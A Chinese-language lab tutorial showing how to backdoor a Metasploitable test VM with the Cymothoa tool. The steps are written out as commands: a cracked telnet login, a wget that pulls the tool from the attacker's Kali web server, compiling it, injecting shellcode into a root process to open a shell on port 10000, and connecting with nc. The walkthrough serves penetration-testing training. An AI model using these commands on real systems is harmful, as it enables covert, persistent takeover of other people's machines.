
# 0X00 原理
1、为了保持持久化的攻击效果，留下后门到目标计算机是个很好的方法<br />2、利用cymothoa创建后门，它可以向进程注入后门，打开后门端口，然后攻击者可以使用NC进行连接获得目标主机的系统的控制权


# 0X01 创建后门
攻击机：kali ：192.168.1.149<br />目标机：metasploitable：192.168.1.18<br />1、利用已经破解的telnet账号登录metasploitable([破解telnet](https://www.yuque.com/xmtxsec/misc/lf1yz4))
```
root@kali222:~# telnet 192.168.1.18
```
<br />![](https://img-blog.csdnimg.cn/20200606161454759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=SowFm&originHeight=432&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2、复制后门文件Cymothoa到目标主机并编译生成可执行文件<br />再开一个终端，kali上启动apache2
```
root@kali222:~# service  apache2  start
```
<br />![](https://img-blog.csdnimg.cn/20200606161722754.png#crop=0&crop=0&crop=1&crop=1&id=LBgdt&originHeight=70&originWidth=412&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将文件cymothoa-1-beta.tar.gz复制到网站根目录/var/www/html<br />![](https://img-blog.csdnimg.cn/20200606161808762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=rjsRJ&originHeight=346&originWidth=828&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

该文件需要复制到对方，解压后去执行编译，以生成可执行程序，利用前面通过telnet获得的metasploit的SHELL完成如下命令
```
root@metasploitable:~# wget  http://192.168.1.149/cymothoa-1-beta.tar.gz
```
<br />![](https://img-blog.csdnimg.cn/20200606161905569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=g7Ttj&originHeight=227&originWidth=723&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```
root@metasploitable:~# cd  /        ----切换目录
root@metasploitable:/# mkdir aaa         ----创建aaa
root@metasploitable:/# cp ~/cymothoa-1-beta.tar.gz  /aaa    ----将文件复制到aaa
root@metasploitable:/# cd  aaa
root@metasploitable:/aaa# tar -xf cymothoa-1-beta.tar.gz  ---解包解压缩
oot@metasploitable:/aaa# cd  cymothoa-1-beta
root@metasploitable:/aaa/cymothoa-1-beta# gcc cymothoa.c -o cymothoa  ------编译并生成可执行文件
root@metasploitable:/aaa/cymothoa-1-beta#
```
<br />![](https://img-blog.csdnimg.cn/20200606162300137.png#crop=0&crop=0&crop=1&crop=1&id=AvxU9&originHeight=166&originWidth=737&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

3、查看目标主机当前运行的进程，找到可以将后门注入的进程（最好USER是root）
```
root@metasploitable:/aaa/cymothoa-1-beta#  ps -aux
```
<br />![](https://img-blog.csdnimg.cn/2020060616272924.png#crop=0&crop=0&crop=1&crop=1&id=V2ZGZ&originHeight=195&originWidth=747&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

4、查看cymothoa可以使用的payload
```
root@metasploitable:/aaa/cymothoa-1-beta# ./cymothoa -S   -----查看payload或者shellcode
```
<br />![](https://img-blog.csdnimg.cn/20200606163023329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Nyb3H&originHeight=348&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

5、把后门注入到进程中
```
root@metasploitable:/aaa/cymothoa-1-beta# ./cymothoa -p 4634 -s 1 -y 10000
参数解析：
这里我们就用序号 1 这个 payload，通过端口来反向 shell。
-p参数：用来指定需要注入的进程的 pid
-s参数：用来指定使用shellcode 的序号
-y参数：用来指定反向 shell 的端口，即别人连接自己时需要连接的端口。
```
运行后当出现 infected 即感染的意思则代表后门注入成功。<br />这里我们使用4560这个PID，当然也可以换成其它的ROOT身份的进程，实验的时候如果后门的NC连接不上，可以换其它的，直接在上面的进程列表中查找对应的进程<br />![](https://img-blog.csdnimg.cn/20200606163320118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=wmPDq&originHeight=324&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# 0X02 利用
在kali终端：
```
root@kali222:~# nc -nvv 192.168.1.18 10000  ---这里的端口号应该与上边生成后门的端口号一致
```
<br />![](https://img-blog.csdnimg.cn/20200606163646453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=lG1q7&originHeight=233&originWidth=617&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
